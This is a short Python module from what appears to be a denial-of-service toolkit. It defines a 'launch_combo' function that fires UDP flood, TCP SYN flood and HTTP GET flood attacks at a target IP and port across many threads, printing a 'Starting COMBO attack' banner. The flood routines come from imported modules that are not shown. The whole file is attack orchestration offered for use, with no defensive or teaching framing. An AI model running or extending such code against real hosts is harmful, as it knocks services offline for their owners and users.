from core import udp_flood, tcp_syn, http_flood

def launch_combo(target_ip, port, threads):
    print("[*] Starting COMBO attack (UDP + SYN + HTTP)")

    udp_flood.udp_flood(target_ip, port, 1000, 512, threads)
    tcp_syn.tcp_syn_flood(target_ip, port, 1000, threads)
    http_flood.http_get_flood(f"http://{target_ip}", 1000, threads)
